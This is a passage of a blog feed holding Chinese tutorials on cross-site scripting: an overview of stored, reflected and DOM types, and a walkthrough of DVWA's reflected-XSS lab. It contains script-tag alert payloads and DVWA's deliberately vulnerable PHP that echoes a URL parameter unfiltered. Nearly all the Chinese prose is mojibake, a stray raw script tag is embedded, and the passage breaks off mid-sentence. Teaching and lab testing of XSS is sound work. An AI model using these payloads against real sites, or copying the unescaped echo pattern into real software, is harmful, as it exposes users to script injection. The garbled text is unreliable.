        <content type="html"><![CDATA[<h1 id="ä»‹ç»">ä»‹ç»</h1><blockquote><p>è·¨ç«™è„šæœ¬æ”»å‡»( Cross Site Scripting )ï¼Œä¸ºäº†å’Œå±‚å æ ·å¼è¡¨ csssåŒºåˆ†ï¼Œç¼©å†™ä¸º XSSã€‚ æ¶æ„æ”»å‡»è€…é€šè¿‡ â€œHTML æ³¨å…¥â€ ç¯¡æ”¹ç½‘é¡µï¼Œå‘ Webé¡µé¢é‡Œæ’å…¥æ¶æ„è„šæœ¬(ä¾‹å¦‚æ¶æ„ javaScript ä»£ç )ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„è„šæœ¬( ä¾‹å¦‚ javaScript ä»£ç  )ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p></blockquote><p>XSS æ˜¯å®¢æˆ·ç«¯ä»£ç æ³¨å…¥ï¼Œé€šå¸¸æ³¨å…¥ä»£ç æ˜¯ JavaScriptã€‚åŒºåˆ«äºå‘½ä»¤æ³¨å…¥ï¼ŒSQLæ³¨å…¥ç­‰æœåŠ¡ç«¯ä»£ç æ³¨å…¥ï¼ŒXSS çš„å½¢æˆå’Œ SQLæ³¨å…¥ä¸€æ ·ï¼Œé€šå¸¸æ˜¯å› ä¸ºå¯¹ç”¨æˆ·å¯æ§çš„åœ°æ–¹ï¼ˆæ•°æ®ï¼‰ä¸å‘½ä»¤åŒºåˆ†ä¸ä¸¥è°¨ï¼ˆè¿‡æ»¤åšçš„ä¸å½»åº•ï¼‰é€ æˆçš„ã€‚</p><h1 id="xss-åˆ†ç±»">XSS åˆ†ç±»</h1><table><colgroup><col style="width: 8%" /><col style="width: 50%" /><col style="width: 8%" /><col style="width: 15%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th>ç±»å‹</th><th>è§¦å‘è¿‡ç¨‹</th><th>å­˜å‚¨åŒº</th><th>è°æ¥è¾“å‡º</th><th>è¾“å‡ºä½ç½®</th></tr></thead><tbody><tr class="odd"><td>å­˜å‚¨å‹ XSS</td><td>1.é»‘å®¢æ„é€  XSS è„šæœ¬<br>2.æ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦ XSS è„šæœ¬çš„é¡µé¢</td><td>åç«¯æ•°æ®åº“</td><td>HTML</td><td>HTTP å“åº”</td></tr><tr class="even"><td>åå°„å‹ XSS</td><td>æ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦ XSS è„šæœ¬çš„ URL</td><td>URL</td><td>åç«¯ Web åº”ç”¨ç¨‹åº</td><td>HTTP å“åº”</td></tr><tr class="odd"><td>DOM å‹ XSS</td><td>æ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦ XSS è„šæœ¬çš„ URL</td><td>URL</td><td>å‰ç«¯ JavaScript</td><td>åŠ¨æ€æ„é€ çš„ DOM ç»“ç‚¹</td></tr></tbody></table><p>è¾“å‡ºåœ¨ HTTP å“åº”ä¸­å’Œè¾“å‡ºåœ¨åŠ¨æ€æ„é€ çš„ DOM ç»“ç‚¹ä¸­æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p><p>ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæš‚æœªææ¸…æ¥šï¼Ÿ</p><h1 id="å±å®³">å±å®³</h1><p>ç›—å–ç”¨æˆ·ä¿¡æ¯ï¼ˆæ¯”å¦‚è·å–ç”¨æˆ·çš„ Cookieï¼‰ã€é’“é±¼ã€åˆ¶é€ è •è™«ç­‰ã€‚</p><h1 id="åˆ†ç±»è¯¦è§£">åˆ†ç±»è¯¦è§£</h1><h2 id="å­˜å‚¨å‹">å­˜å‚¨å‹</h2><h3 id="åŸç†">åŸç†</h3><h4 id="å½¢æˆ">å½¢æˆ</h4><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/form_stored_xss.png" /></p><ol type="1"><li>é»‘å®¢æ„é€ æºå¸¦ XSS è„šæœ¬çš„å†…å®¹</li><li>æµè§ˆå™¨å°†æºå¸¦ XSS è„šæœ¬çš„é¡µé¢å†…å®¹æäº¤ç»™ web æœåŠ¡å™¨</li><li>Web æœåŠ¡å™¨ä¸­çš„ Web æœåŠ¡å™¨è½¯ä»¶(ä¾‹å¦‚ï¼šå…è´¹çš„ HTTP æœåŠ¡å™¨è½¯ä»¶ï¼šApacheå’Œ Nginx ) å¤„ç†æµè§ˆå™¨ä¸ Web æœåŠ¡å™¨çš„è¿æ¥ä¸è¯·æ±‚è¿‡ç¨‹</li><li>Web æœåŠ¡å™¨è½¯ä»¶æ ¹æ® HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œè§£ææ–‡ä»¶ä½ç½®ã€å¤„ç†è¯·æ±‚å‚æ•°</li><li>è„šæœ¬è¯­è¨€è§£é‡Šå™¨ï¼ˆå¦‚ï¼šphp è¯­è¨€è§£é‡Šå™¨ï¼‰ä» WebæœåŠ¡å™¨è½¯ä»¶è·å–è¯·æ±‚å‚æ•°ï¼Œå¹¶è§£é‡Šå¯¹åº”æ–‡ä»¶ï¼Œï¼ˆå­˜å‚¨å‹ XSSçš„åç«¯è„šæœ¬æ–‡ä»¶ä¸€å®šæ˜¯æœ‰æ•°æ®åº“æœ‰äº¤äº’çš„ï¼‰</li><li>è§£é‡Šæ‰§è¡Œçš„ php è„šæœ¬ä¸æ•°æ®åº“äº¤äº’ï¼Œå°†æºå¸¦ XSSè„šæœ¬çš„å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ã€‚</li><li>Web æœåŠ¡å™¨è½¯ä»¶å¤„ç†æµè§ˆå™¨ä¸ Web æœåŠ¡å™¨çš„åº”ç­”è¿‡ç¨‹ä»¥åŠå…³é—­è¿æ¥</li></ol><h4 id="è§¦å‘">è§¦å‘</h4><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/trigger_stored_xss_.png" /></p><ol type="1"><li>ç”¨æˆ·æˆ–ç®¡ç†å‘˜æ‰“å¼€æµè§ˆå™¨è®¿é—®å­˜åœ¨ XSS è„šæœ¬çš„é¡µé¢</li><li>æµè§ˆå™¨å°†é¡µé¢å†…å®¹è¯·æ±‚æäº¤ç»™ web æœåŠ¡å™¨</li><li>Web æœåŠ¡å™¨ä¸­çš„ Web æœåŠ¡å™¨è½¯ä»¶(ä¾‹å¦‚ï¼šå…è´¹çš„ HTTP æœåŠ¡å™¨è½¯ä»¶ï¼šApacheå’Œ Nginx ) å¤„ç†æµè§ˆå™¨ä¸ Web æœåŠ¡å™¨çš„è¿æ¥ä¸è¯·æ±‚è¿‡ç¨‹</li><li>Web æœåŠ¡å™¨è½¯ä»¶æ ¹æ® HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œè§£ææ–‡ä»¶ä½ç½®ã€å¤„ç†è¯·æ±‚å‚æ•°</li><li>è„šæœ¬è¯­è¨€è§£é‡Šå™¨ï¼ˆå¦‚ï¼šphp è¯­è¨€è§£é‡Šå™¨ï¼‰ä» WebæœåŠ¡å™¨è½¯ä»¶è·å–è¯·æ±‚å‚æ•°ï¼Œå¹¶è§£é‡Šå¯¹åº”æ–‡ä»¶ï¼Œï¼ˆå­˜å‚¨å‹ XSSçš„åç«¯è„šæœ¬æ–‡ä»¶ä¸€å®šæ˜¯æœ‰æ•°æ®åº“æœ‰äº¤äº’çš„ï¼‰</li><li>è§£é‡Šæ‰§è¡Œçš„ php è„šæœ¬ä¸æ•°æ®åº“äº¤äº’ï¼Œå°†å­˜å‚¨åœ¨æ•°æ®åº“ä¸­æ¶æ„ xssè„šæœ¬ï¼ˆä¸€èˆ¬ä¸ºç½‘ç«™ç•™è¨€ç­‰ï¼‰æŸ¥è¯¢å‡ºæ¥ï¼Œå¹¶æ‹¼æ¥åˆ°é¡µé¢çš„æŸä¸ªåœ°æ–¹ã€‚</li><li>Web æœåŠ¡å™¨è½¯ä»¶å¤„ç†æµè§ˆå™¨ä¸ WebæœåŠ¡å™¨çš„åº”ç­”è¿‡ç¨‹ï¼Œå°†å†…å®¹è¿”å›ç»™ç”¨æˆ·æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ¸²æŸ“ HTMLå¹¶æ˜¾ç¤ºï¼Œå› è€Œè§¦å‘ XSS</li></ol><p>å­˜å‚¨å‹ XSS æ˜¯ ä»æ•°æ®åº“ä¸­æå–æ¶æ„çš„ è„šæœ¬ä»£ç ï¼ˆphpè„šæœ¬ä¸æ•°æ®åº“æœ‰äº¤äº’ï¼‰</p><p>é‚£è¿™æ˜¯ä¸æ˜¯å…ˆä»å‚æ•°ä¸­è·å–å­˜å…¥æ•°æ®åº“ä¸­ï¼Œç„¶åå†ä»æ•°æ®åº“ä¸­è·å–å‘¢ï¼Ÿ</p><p>ç±»ä¼¼äºä½¿ç”¨æ³¨å…¥ç‚¹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥ï¼Ÿ</p><h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3><h2 id="åå°„æ€§">åå°„æ€§</h2><p>åå°„å‹ XSS åˆç§°ä¸ºéæŒä¹…æ€§XSSï¼Œè¿™ç§æ”»å‡»å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ï¼Œç‚¹å‡»è®¿é—®ä¸€æ¬¡å«æ¶æ„è„šæœ¬çš„ url è¿›è¡Œè§¦å‘ã€‚</p><p>ä¸å­˜å‚¨å‹ XSS ä¸åŒçš„æ˜¯ï¼Œåå°„æ€§ XSS å¯ä»¥åœ¨é“¾æ¥ ï¼ˆurl ï¼‰ä¸­æŸ¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„XSS è„šæœ¬ç‰¹å¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ—¶é€šå¸¸é‡‡ç”¨ urlç¼–ç ã€ç”Ÿäº§çŸ­ç½‘å€çš„æ–¹å¼å¢åŠ éšè”½æ€§ï¼Œä»¥æœŸå‡å¼±ç”¨æˆ·çš„è­¦æƒ•æ€§ã€‚</p><p>ä¸€èˆ¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨åå°„å‹ XSSçš„æ–¹å¼ï¼šçœ‹ä½ çš„è¾“å…¥æ˜¯å¦ä¼šåœ¨é¡µé¢ä¸ŠæŸä¸ªåœ°æ–¹æ˜¾ç¤ºï¼Œå½“ç„¶ï¼Œä¸€èˆ¬ä½ çš„è¾“å…¥è¦æœ‰å”¯ä¸€æ€§ï¼Œè¿™æ ·æ‰å¥½ç¡®å®šçš„æ˜¾ç¤ºçš„æ˜¯ä¸æ˜¯ä½ è¾“å…¥çš„å‘€</p><h3 id="åŸç†-1">åŸç†</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/reflected%20xss_prici.png"alt="1565781435376" /><figcaption aria-hidden="true">1565781435376</figcaption></figure><h4 id="å½¢æˆ-1">å½¢æˆ</h4><p>ä¸‹é¢çš„æµç¨‹å°±ä¸å†™é‚£ä¹ˆè¯¦ç»†äº†....</p><ol type="1"><li>æ”»å‡»è€…é€šè¿‡é‚®ä»¶ç­‰å½¢å¼å°†åŒ…å« XSSä»£ç çš„é“¾æ¥å‘é€ç»™æ­£å¸¸ç”¨æˆ·ï¼Œç”¨æˆ·ç‚¹å‡»è®¿é—®è¯¥ URL</li><li>æµè§ˆå™¨å‘ web æœåŠ¡å™¨å‘é€è¯·æ±‚</li><li>Web æœåŠ¡å™¨è½¯ä»¶è§£æå¤„ç†åº”ç”¨å‚æ•°</li><li>php è¯­è¨€è§£é‡Šå™¨å®šä½åˆ°å¯¹åº” php æ–‡ä»¶ï¼Œè§£é‡Šæ‰§è¡Œå¯¹åº” phpè„šæœ¬ï¼Œè·å–è¯·æ±‚å‚æ•°ï¼ˆå³ï¼šæ¶æ„ XSS è„šæœ¬ï¼‰æ‹¼æ¥åˆ°é¡µé¢å†…å®¹ä¸­ï¼Œç”Ÿæˆ htmlæ–‡ä»¶</li><li>Web æœåŠ¡å™¨è½¯ä»¶å“åº”å¯¹åº”é¡µé¢å†…å®¹ï¼Œç„¶åæŠŠå¸¦æœ‰ XSS çš„ä»£ç ï¼ˆä¸€èˆ¬ä¸ºjavaScript è„šæœ¬ï¼‰çš„ HTML å‘é€ç»™ç”¨æˆ·</li><li>ç”¨æˆ·æµè§ˆå™¨æ¸²æŸ“ HTML ï¼Œè§¦å‘ XSS æ¼æ´ã€‚</li></ol><h4 id="è§¦å‘-1">è§¦å‘</h4><p>åå°„å‹ XSS æ˜¯ä» URL ä¸­æå–çš„å‚æ•°ä¸­å«æœ‰æ¶æ„è„šæœ¬ä»£ç ã€‚</p><h3 id="ç¤ºä¾‹-1">ç¤ºä¾‹</h3><p>é»‘å®¢åœ¨ url ä¸­æ’å…¥æ¶æ„è„šæœ¬ï¼Œç„¶åå‘ç»™ç”¨æˆ·ç‚¹å‡»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa-master/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·ç‚¹å‡»è®¿é—®ï¼Œåç«¯ phpå¼€å§‹å¤„ç†æäº¤çš„å‚æ•°ï¼ˆå½“ç„¶ï¼Œå‚æ•°æ˜¯ä¹‹å‰é»‘å®¢æ„é€ çš„æ¶æ„è„šæœ¬ï¼‰ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åç«¯ phpä»£ç å¯¹è¾“å…¥å‚æ•°æœªç»è¿‡æ»¤å°±ç›´æ¥æ‹¼æ¥ï¼Œå¯¼è‡´è„šæœ¬æ‹¼æ¥ä¹‹åè§£æå‡ºæ¥çš„æ˜¯ä»¥ä¸‹ä»£ç ï¼Œè¿™æ ·æµè§ˆå™¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå°±ä¼šäº§ç”Ÿå¼¹å‡ºã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æµç¨‹ï¼š</p><ol type="1"><li>è¾“å…¥é¡µé¢ä¸Šæ¯”è¾ƒå”¯ä¸€çš„æ­£å¸¸å­—ç¬¦ä¸²ï¼ˆæ— å¼•å·ï¼Œæ— å¤§äºå°äºå·ï¼‰ï¼Œçœ‹æœ‰æ²¡æœ‰åœ¨é¡µé¢ä¸Šå›æ˜¾ï¼Œå³é”®æŸ¥çœ‹æºç æˆ–å¼€å‘è€…å·¥å…·ä¸­å®šä½åˆ°æ˜¾ç¤ºä½ï¼Œçœ‹æ˜¯ä»€ä¹ˆæ ‡ç­¾ã€‚</li><li>å°è¯•è¾“å…¥ä¸€äº›å¸¦æœ‰å¤§äºå°äºå·å¯¹æˆ–å¼•å·çš„ä¸æ­£å¸¸å­—ç¬¦ä¸²ï¼Œçœ‹é¡µé¢å¦‚ä½•æ˜¾ç¤ºï¼ŒæŒ‰F12 æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå®šä½åˆ°æ˜¾ç¤ºä½ç½®çœ‹å¦‚ä½•è§£ææˆ‘ä»¬çš„è¾“å…¥</li><li></li></ol><h2 id="dom">DOM</h2><p>DOM å‹çš„ XSS ç”±äºå…¶ç‰¹æ®Šæ€§ï¼Œå¸¸å¸¸è¢«åˆ†ä¸ºç¬¬ä¸‰ç§ï¼Œè¿™æ˜¯ä¸€ç§åŸºäº DOM æ ‘çš„XSSã€‚ä¾‹å¦‚æœåŠ¡å™¨ç«¯ç»å¸¸ä½¿ç”¨ document.boby.innerHtml ç­‰å‡½æ•°åŠ¨æ€ç”Ÿæˆ htmlé¡µé¢ï¼Œå¦‚æœè¿™äº›å‡½æ•°åœ¨å¼•ç”¨æŸäº›å˜é‡æ—¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–æ£€æŸ¥ï¼Œå°±ä¼šäº§ç”Ÿ DOM å‹çš„XSSã€‚DOM å‹ XSS å¯èƒ½æ˜¯å­˜å‚¨å‹ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯åå°„å‹ã€‚</p><h3 id="åŸç†-2">åŸç†</h3><ol type="1"><li>ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è®¿é—®æºå¸¦æœ‰ XSS è„šæœ¬çš„é“¾æ¥</li><li>æµè§ˆå™¨é€šè¿‡ JavaScript ä» URL ä¸­æå– XSS è„šæœ¬ä¸­çš„å†…å®¹ï¼Œå¹¶å†™å…¥åˆ° DOMä¸­ï¼Œè§¦å‘ XSS</li></ol><p>DOM å‹ä¸åå°„å‹çš„åŒºåˆ«ï¼šDOM å‹é€šè¿‡å‰ç«¯ JavaScript å°† XSS è„šæœ¬å†™å…¥åˆ° DOMä¸­è§¦å‘ XSSï¼Œè€Œåå°„å‹æ˜¯é€šè¿‡åç«¯ Web æœåŠ¡å™¨ä¸­çš„ PHP è§£é‡Šæ‰§è¡Œå°† XSSè„šæœ¬å†™å…¥åˆ°é¡µé¢ä¸­ã€‚æµè§ˆå™¨æ¸²æŸ“å“åº”é¡µé¢è§¦å‘ XSSã€‚</p><p>DOM å‹ XSS çš„ä¸€ç§æƒ…å†µï¼š</p><p>XSS ä¸æ˜¯åœ¨ URL çš„å‚æ•°ä¸­è€Œæ˜¯åœ¨ URL çš„ hash ä¸­ï¼ŒURL çš„ hashæ˜¯ä¸ä¼šå‘é€åˆ° åç«¯ Web æœåŠ¡å™¨çš„ï¼Œè¯´æ˜å‘é¡µé¢è¾“å‡º XSSè„šæœ¬çš„ä¸æ˜¯åç«¯ï¼Œæ˜¯å‰ç«¯é¡µé¢ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­æœç´¢ hash æ¥å®šä½ã€‚</p><p>å¦‚æœæ”¹å˜ # åé¢ hash çš„å†…å®¹ï¼Œç‚¹å‡»Enterï¼Œé¡µé¢æ˜¯ä¸ä¼šé‡è½½çš„ï¼Œä½ éœ€è¦æ‰‹åŠ¨å»åˆ·æ–°ã€‚</p><p>dom å‹ xss æ˜¯ç”± javascriptæ¥è§¦å‘çš„ï¼Œæ‰€ä»¥ä¸èƒ½æƒ³å…¶ä»–ä¸¤ç§é‚£æ ·é€šè¿‡æŸ¥çœ‹é¡µé¢æºä»£ç çš„æ–¹å¼åœ¨ html ä¸­æ‰¾åˆ°xss è„šæœ¬ä»£ç ã€‚æˆ‘ä»¬éœ€è¦å»å¼€å‘è€…å·¥å…·ä¸­çš„è¿˜æœ‰ js è„šæœ¬çš„ html ä¸­æœç´¢ã€‚</p><p>è¡¥å……ï¼š</p><p>JavaScript ä¸­çš„ä¸‰ä¸ªå¼¹çª—å‡½æ•°ï¼šalert() confirm() prompt()</p><p>æ ¹æ®æœåŠ¡å™¨çš„è¿‡æ»¤æƒ…å†µï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å…¶ä»–å‡½æ•°ã€‚</p><h3 id="æ–‡ç« æ¨è">æ–‡ç« æ¨èï¼š</h3><p><ahref="https://tech.meituan.com/2018/09/27/fe-security.html">å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSS æ”»å‡»ï¼Ÿ</a></p><p><ahref="https://blog.csdn.net/u011781521/article/details/53894399">XSSè·¨ç«™è„šæœ¬æ”»å‡»(ä¸€)----XSS æ”»å‡»çš„ä¸‰ç§ç±»å‹</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA ä¸­çš„ XSS</title>
      <link href="/blog/2019/08/15/websec/xss/xss_dvwa/"/>
      <url>/blog/2019/08/15/websec/xss/xss_dvwa/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆæˆ‘ä»¬å¤§è‡´äº†è§£ä¸€ä¸‹ dvwa çš„ä»£ç ç»“æ„ï¼ˆä»¥ xss çš„ä¸ºä¾‹ï¼Œå…¶ä»–ç±»ä¼¼ï¼‰</p><p>dvwa æ¯ä¸ªé¡µé¢æœ‰ä¸€ä¸ª index.php ï¼Œåœ¨ index.php ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;security&#x27;</span> ] ) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;low&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;low.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;medium&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;medium.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;high&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;high.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;impossible.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;vulnerabilities/xss_r/source/<span class="subst">&#123;$vulnerabilityFile&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>å®ƒé€šè¿‡åˆ¤æ–­ cookie ä¸­çš„ security æ¥å†³å®šå°†å‚æ•°æäº¤åˆ°å“ªä¸€ä¸ª phpè„šæœ¬ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹æºç éœ€è¦çœ‹ lowã€mediumã€highã€impossibleè¿™äº›åç«¯è„šæœ¬å¦‚ä½•å¤„ç†å‚æ•°ã€‚</p><h1 id="reflected-xss">Reflected XSS</h1><h2 id="low">low</h2><p>é»‘ç›’æµ‹è¯•</p><ol type="1"><li><p>æ¢æµ‹ xss</p><p>æ„é€ ä¸€ä¸ªç‹¬ä¸€æ— äºŒä¸”ä¸ä¼šè¢«è¯†åˆ«ä¸ºæ¶æ„ä»£ç çš„å­—ç¬¦ä¸²ç”¨æ¥æäº¤åˆ°é¡µé¢ï¼Œè¿™é‡Œæ„é€ kiddingï¼Œå¹¶æäº¤ã€‚</p><p>çœ‹é¡µé¢å›æ˜¾ä»¥åŠä½¿ç”¨æµè§ˆå™¨å®¡æŸ¥å·¥å…·è¿›è¡Œä»£ç å®¡æŸ¥ï¼Œå¯»æ‰¾æ„é€ çš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨é¡µé¢ä¸­æ˜¾ç¤ºã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_low.png" /></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡µé¢ä¸Šå›æ˜¾ï¼šHello kiddingï¼Œè€Œä¸”åœ¨ Elements ä¸­æˆ‘ä»¬å‘ç°Hello kidding è¿™ä¸ªæ–‡æœ¬ï¼Œå¹¶æœªä½¿ç”¨å­—ç¬¦ä¸²åŒ…è£¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥</p><script><p>æ ‡ç­¾ï¼Œå®ƒå°±ä¼šå½“æˆè„šæœ¬æ‰§è¡Œã€‚</p></li><li><p>æµ‹è¯• xss</p><p>é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥ï¼š&lt;script&gt;alert(/xss/)&lt;/script&gt;æˆ–&lt;/pre&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p><p>å¦‚æœä¸å¼¹çª—è€Œä¸”é¡µé¢å°†æˆ‘ä»¬çš„è¾“å…¥å®Œæ•´çš„å›æ˜¾å‡ºæ¥æˆ–è€…éƒ½è½¬æˆå®ä½“ç¼–ç å‘¼å›æ˜¾å‡ºæ¥ï¼Œé‚£å…«æˆæ˜¯å‡‰äº†ï¼Œhtmlspecialcharsè­¦å‘Šã€‚ï¼ˆä½ å» å¼€å‘è€…å·¥å…·å®šä½ï¼Œç¼–è¾‘htmlï¼Œå°±å¯ä»¥çœ‹åˆ°å®ƒå°†&lt;&gt;ç­‰ç‰¹æ®Šç¬¦å·å®ä½“ç¼–ç äº†ï¼‰</p><p>å¼¹çª—æˆåŠŸï¼Œé»‘ç›’æµ‹è¯•å®Œæˆ(ç¬¬äºŒç§ payloadåªæ˜¯å‘Šè¯‰ä½ å¯ä»¥é—­åˆå‰é¢æ ‡ç­¾ï¼Œå†å†™ script æ ‡ç­¾)</p></li></ol><p>ä»£ç è®²è§£</p><p>ä¸Šä»£ç ï¼šlow.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>array_key_exists()å‡½æ•°æ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æœé”®åå­˜åœ¨åˆ™è¿”å›trueï¼Œå¦‚æœé”®åä¸å­˜åœ¨åˆ™è¿”å› falseã€‚</p><p>è¿™é‡Œçš„ if è¯­å¥</p><p>ä¸€æ–¹é¢æ£€æŸ¥ $GET æ•°ç»„ä¸­æœ‰æ—  nameè¿™ä¸ªé”®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œå³ï¼šæ£€æŸ¥æœ‰æ²¡æœ‰æäº¤è¿™ä¸ª name å‚æ•°</p><p>æäº¤ name å‚æ•°çŠ¶æ€ï¼š</p><p>http://localhost/dvwa-master/vulnerabilities/xss_r/?name=</p><p>æœªæäº¤ name 